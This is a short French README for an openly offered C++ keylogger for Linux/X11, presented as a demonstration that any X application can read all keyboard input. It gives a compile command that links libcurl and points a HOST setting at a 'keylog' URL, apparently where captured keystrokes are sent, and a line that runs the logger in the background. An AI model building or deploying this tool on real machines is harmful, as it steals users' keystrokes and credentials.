# Ulogger
  
Dev: https://twitter.com/atmon3r  
Sources: https://framagit.org/tuxicoman/keylogger  
C++ Keylogger pour Linux avec Xserver.  
Ce code illustre le fait que chaque application X peut écouter l'ensemble des événements du clavier, même si elle n'a pas le focus.

Compile:  
g++ -ansi -Wall -Wno-deprecated-declarations -pedantic -O3 -o keylogger keylogger.cpp -L/usr/X11R6/lib -lX11 -lcurl '-DHOST=(char*)"http://localhost/?page=keylog"'

Usage:
./keylogger &
